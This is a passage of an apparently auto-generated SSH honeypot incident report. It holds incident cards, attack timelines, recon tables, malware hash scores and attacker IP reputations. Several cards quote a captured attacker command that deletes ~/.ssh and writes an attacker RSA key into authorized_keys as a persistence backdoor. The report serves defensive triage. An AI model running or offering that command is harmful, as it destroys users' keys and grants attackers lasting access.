| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 09:40:26` | `cowrie.session.connect` |
| `2026-04-13 09:40:26` | `cowrie.client.version` |
| `2026-04-13 09:40:26` | `cowrie.client.kex` |
| `2026-04-13 09:40:27` | `cowrie.login.success` |
| `2026-04-13 09:40:28` | `cowrie.session.params` |
| `2026-04-13 09:40:28` | `cowrie.command.input` |
| `2026-04-13 09:40:28` | `cowrie.command.failed` |
| `2026-04-13 09:40:28` | `cowrie.log.closed` |
| `2026-04-13 09:40:29` | `cowrie.session.params` |
| `2026-04-13 09:40:29` | `cowrie.command.input` |
| `2026-04-13 09:40:29` | `cowrie.session.file_download` |
| `2026-04-13 09:40:29` | `cowrie.log.closed` |
| `2026-04-13 09:40:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `76.79.213[.]69` to AbuseIPDB if not already reported
- [ ] Block `76.79.213[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-021833d82b67

| Field | Detail |
|---|---|
| **Source IP** | `76.79.213[.]69` |
| **First Seen** | 2026-04-13 09:40 |
| **Last Seen** | 2026-04-13 09:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 09:40:33` | `cowrie.session.connect` |
| `2026-04-13 09:40:33` | `cowrie.client.version` |
| `2026-04-13 09:40:33` | `cowrie.client.kex` |
| `2026-04-13 09:40:34` | `cowrie.login.success` |
| `2026-04-13 09:40:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `76.79.213[.]69` to AbuseIPDB if not already reported
- [ ] Block `76.79.213[.]69` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1c4898c6c1e

| Field | Detail |
|---|---|
| **Source IP** | `223.197.248[.]209` |
| **First Seen** | 2026-04-13 09:42 |
| **Last Seen** | 2026-04-13 09:42 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 09:42:50` | `cowrie.session.connect` |
| `2026-04-13 09:42:50` | `cowrie.client.version` |
| `2026-04-13 09:42:51` | `cowrie.client.kex` |
| `2026-04-13 09:42:51` | `cowrie.login.success` |
| `2026-04-13 09:42:52` | `cowrie.session.params` |
| `2026-04-13 09:42:52` | `cowrie.command.input` |
| `2026-04-13 09:42:52` | `cowrie.command.failed` |
| `2026-04-13 09:42:52` | `cowrie.log.closed` |
| `2026-04-13 09:42:52` | `cowrie.session.params` |
| `2026-04-13 09:42:52` | `cowrie.command.input` |
| `2026-04-13 09:42:52` | `cowrie.session.file_download` |
| `2026-04-13 09:42:52` | `cowrie.log.closed` |
| `2026-04-13 09:42:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.197.248[.]209` to AbuseIPDB if not already reported
- [ ] Block `223.197.248[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2f52bfb6ed9

| Field | Detail |
|---|---|
| **Source IP** | `223.197.248[.]209` |
| **First Seen** | 2026-04-13 09:42 |
| **Last Seen** | 2026-04-13 09:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 09:42:54` | `cowrie.session.connect` |
| `2026-04-13 09:42:54` | `cowrie.client.version` |
| `2026-04-13 09:42:54` | `cowrie.client.kex` |
| `2026-04-13 09:42:55` | `cowrie.login.success` |
| `2026-04-13 09:42:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.197.248[.]209` to AbuseIPDB if not already reported
- [ ] Block `223.197.248[.]209` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68bb4c91dd7f

| Field | Detail |
|---|---|
| **Source IP** | `223.197.248[.]209` |
| **First Seen** | 2026-04-13 09:47 |
| **Last Seen** | 2026-04-13 09:47 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 09:47:31` | `cowrie.session.connect` |
| `2026-04-13 09:47:31` | `cowrie.client.version` |
| `2026-04-13 09:47:32` | `cowrie.client.kex` |
| `2026-04-13 09:47:32` | `cowrie.login.success` |
| `2026-04-13 09:47:32` | `cowrie.session.params` |
| `2026-04-13 09:47:32` | `cowrie.command.input` |
| `2026-04-13 09:47:32` | `cowrie.command.failed` |
| `2026-04-13 09:47:33` | `cowrie.log.closed` |
| `2026-04-13 09:47:33` | `cowrie.session.params` |
| `2026-04-13 09:47:33` | `cowrie.command.input` |
| `2026-04-13 09:47:33` | `cowrie.session.file_download` |
| `2026-04-13 09:47:33` | `cowrie.log.closed` |
| `2026-04-13 09:47:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.197.248[.]209` to AbuseIPDB if not already reported
- [ ] Block `223.197.248[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb942a9bf756

| Field | Detail |
|---|---|
| **Source IP** | `223.197.248[.]209` |
| **First Seen** | 2026-04-13 09:47 |
| **Last Seen** | 2026-04-13 09:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 09:47:35` | `cowrie.session.connect` |
| `2026-04-13 09:47:35` | `cowrie.client.version` |
| `2026-04-13 09:47:35` | `cowrie.client.kex` |
| `2026-04-13 09:47:36` | `cowrie.login.success` |
| `2026-04-13 09:47:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.197.248[.]209` to AbuseIPDB if not already reported
- [ ] Block `223.197.248[.]209` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20cd3117d29c

| Field | Detail |
|---|---|
| **Source IP** | `76.79.213[.]69` |
| **First Seen** | 2026-04-13 09:50 |
| **Last Seen** | 2026-04-13 09:50 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 09:50:12` | `cowrie.session.connect` |
| `2026-04-13 09:50:12` | `cowrie.client.version` |
| `2026-04-13 09:50:12` | `cowrie.client.kex` |
| `2026-04-13 09:50:13` | `cowrie.login.success` |
| `2026-04-13 09:50:14` | `cowrie.session.params` |
| `2026-04-13 09:50:14` | `cowrie.command.input` |
| `2026-04-13 09:50:14` | `cowrie.command.failed` |
| `2026-04-13 09:50:14` | `cowrie.log.closed` |
| `2026-04-13 09:50:15` | `cowrie.session.params` |
| `2026-04-13 09:50:15` | `cowrie.command.input` |
| `2026-04-13 09:50:15` | `cowrie.session.file_download` |
| `2026-04-13 09:50:15` | `cowrie.log.closed` |
| `2026-04-13 09:50:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `76.79.213[.]69` to AbuseIPDB if not already reported
- [ ] Block `76.79.213[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90fff20c2ae6

| Field | Detail |
|---|---|
| **Source IP** | `76.79.213[.]69` |
| **First Seen** | 2026-04-13 09:50 |
| **Last Seen** | 2026-04-13 09:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 09:50:19` | `cowrie.session.connect` |
| `2026-04-13 09:50:19` | `cowrie.client.version` |
| `2026-04-13 09:50:19` | `cowrie.client.kex` |
| `2026-04-13 09:50:20` | `cowrie.login.success` |
| `2026-04-13 09:50:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `76.79.213[.]69` to AbuseIPDB if not already reported
- [ ] Block `76.79.213[.]69` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe414974e6e3

| Field | Detail |
|---|---|
| **Source IP** | `223.197.248[.]209` |
| **First Seen** | 2026-04-13 09:50 |
| **Last Seen** | 2026-04-13 09:50 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 09:50:38` | `cowrie.session.connect` |
| `2026-04-13 09:50:38` | `cowrie.client.version` |
| `2026-04-13 09:50:38` | `cowrie.client.kex` |
| `2026-04-13 09:50:39` | `cowrie.login.success` |
| `2026-04-13 09:50:39` | `cowrie.session.params` |
| `2026-04-13 09:50:39` | `cowrie.command.input` |
| `2026-04-13 09:50:39` | `cowrie.command.failed` |
| `2026-04-13 09:50:39` | `cowrie.log.closed` |
| `2026-04-13 09:50:40` | `cowrie.session.params` |
| `2026-04-13 09:50:40` | `cowrie.command.input` |
| `2026-04-13 09:50:40` | `cowrie.session.file_download` |
| `2026-04-13 09:50:40` | `cowrie.log.closed` |
| `2026-04-13 09:50:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.197.248[.]209` to AbuseIPDB if not already reported
- [ ] Block `223.197.248[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3cb31183387a

| Field | Detail |
|---|---|
| **Source IP** | `223.197.248[.]209` |
| **First Seen** | 2026-04-13 09:50 |
| **Last Seen** | 2026-04-13 09:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 09:50:42` | `cowrie.session.connect` |
| `2026-04-13 09:50:42` | `cowrie.client.version` |
| `2026-04-13 09:50:42` | `cowrie.client.kex` |
| `2026-04-13 09:50:43` | `cowrie.login.success` |
| `2026-04-13 09:50:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.197.248[.]209` to AbuseIPDB if not already reported
- [ ] Block `223.197.248[.]209` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c05e8d8e64a

| Field | Detail |
|---|---|
| **Source IP** | `223.197.248[.]209` |
| **First Seen** | 2026-04-13 09:52 |
| **Last Seen** | 2026-04-13 09:52 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 09:52:18` | `cowrie.session.connect` |
| `2026-04-13 09:52:18` | `cowrie.client.version` |
| `2026-04-13 09:52:19` | `cowrie.client.kex` |
| `2026-04-13 09:52:19` | `cowrie.login.success` |
| `2026-04-13 09:52:20` | `cowrie.session.params` |
| `2026-04-13 09:52:20` | `cowrie.command.input` |
| `2026-04-13 09:52:20` | `cowrie.command.failed` |
| `2026-04-13 09:52:20` | `cowrie.log.closed` |
| `2026-04-13 09:52:20` | `cowrie.session.params` |
| `2026-04-13 09:52:20` | `cowrie.command.input` |
| `2026-04-13 09:52:20` | `cowrie.session.file_download` |
| `2026-04-13 09:52:20` | `cowrie.log.closed` |
| `2026-04-13 09:52:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.197.248[.]209` to AbuseIPDB if not already reported
- [ ] Block `223.197.248[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4da96848ac0

| Field | Detail |
|---|---|
| **Source IP** | `223.197.248[.]209` |
| **First Seen** | 2026-04-13 09:52 |
| **Last Seen** | 2026-04-13 09:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 09:52:22` | `cowrie.session.connect` |
| `2026-04-13 09:52:22` | `cowrie.client.version` |
| `2026-04-13 09:52:22` | `cowrie.client.kex` |
| `2026-04-13 09:52:23` | `cowrie.login.success` |
| `2026-04-13 09:52:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.197.248[.]209` to AbuseIPDB if not already reported
- [ ] Block `223.197.248[.]209` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `124.163.255[.]210` | **28** | 2026-04-13 07:29 | 2026-04-13 08:17 | 56m | 0 | `T1592` | 🟠 MEDIUM |
| `76.79.213[.]69` | **22** | 2026-04-13 09:20 | 2026-04-13 09:51 | 0m | 22 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `14.103.117[.]91` | **20** | 2026-04-13 06:17 | 2026-04-13 06:42 | 38m | 0 | `T1592` | 🟠 MEDIUM |
| `180.76.98[.]88` | **20** | 2026-04-13 07:28 | 2026-04-13 07:48 | 32m | 2 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `223.197.248[.]209` | **20** | 2026-04-13 09:19 | 2026-04-13 09:52 | 0m | 20 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `102.88.137[.]145` | **19** | 2026-04-13 06:13 | 2026-04-13 06:47 | 0m | 19 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `177.70.6[.]158` | **19** | 2026-04-13 06:13 | 2026-04-13 06:46 | 0m | 19 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `112.216.108[.]62` | **18** | 2026-04-13 06:14 | 2026-04-13 06:43 | 0m | 18 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `103.123.53[.]88` | **16** | 2026-04-13 06:13 | 2026-04-13 06:40 | 0m | 16 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `14.103.46[.]177` | **13** | 2026-04-13 06:13 | 2026-04-13 06:23 | 22m | 2 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `106.92.205[.]206` | **9** | 2026-04-13 09:23 | 2026-04-13 09:38 | 5m | 5 | `T1110.001 · T1592` | 🟢 LOW |
| `180.184.38[.]93` | **2** | 2026-04-13 07:30 | 2026-04-13 07:32 | 4m | 0 | `T1592` | 🟢 LOW |
| `1.220.119[.]116` | 1 | 2026-04-13 07:28 | 2026-04-13 07:28 | 30s | 0 | `T1592` | 🟢 LOW |
| `103.77.215[.]165` | 1 | 2026-04-13 07:39 | 2026-04-13 07:39 | 8s | 0 | `T1592` | 🟢 LOW |
| `114.33.2[.]111` | 1 | 2026-04-13 07:15 | 2026-04-13 07:15 | 30s | 0 | `T1592` | 🟢 LOW |
| `117.57.205[.]36` | 1 | 2026-04-13 09:21 | 2026-04-13 09:23 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.175[.]69` | 1 | 2026-04-13 06:16 | 2026-04-13 06:18 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.112[.]105` | 1 | 2026-04-13 06:14 | 2026-04-13 06:14 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.127[.]71` | 1 | 2026-04-13 06:13 | 2026-04-13 06:13 | 120s | 0 | `T1592` | 🟢 LOW |
| `203.0.104[.]170` | 1 | 2026-04-13 06:16 | 2026-04-13 06:18 | 120s | 0 | `T1592` | 🟢 LOW |
| `209.38.47[.]162` | 1 | 2026-04-13 06:21 | 2026-04-13 06:21 | 8s | 0 | `T1592` | 🟢 LOW |
| `49.88.156[.]34` | 1 | 2026-04-13 06:23 | 2026-04-13 06:24 | 58s | 0 | `T1592` | 🟢 LOW |
| `83.255.54[.]184` | 1 | 2026-04-13 08:57 | 2026-04-13 08:57 | 13s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (22 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 41/100 | 🟡 MEDIUM | **29/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 46/100 | 🟡 MEDIUM | **43/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 41/100 | 🟡 MEDIUM | **28/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 46/100 | 🟡 MEDIUM | **43/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 46/100 | 🟡 MEDIUM | **43/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 46/100 | 🟡 MEDIUM | **43/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 46/100 | 🟡 MEDIUM | **43/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `114.33.2[.]111` | TW | Chunghwa Telecom Co.,Ltd. | **100** ⚠️ | 13 |
| `49.88.156[.]34` | CN | CHINANET jiangsu province network | **100** ⚠️ | 50 |
| `106.92.205[.]206` | CN | CHINANET Chongqing Province Network | **100** ⚠️ | 1 |
| `102.88.137[.]145` | NG | MTN Nigeria | **100** ⚠️ | 50 |
| `103.123.53[.]88` | IN | YOTTA NETWORK SERVICES PRIVATE LIMITED | **100** ⚠️ | 50 |
| `83.255.54[.]184` | SE | Tele2 Sverige AB | **100** ⚠️ | 2 |
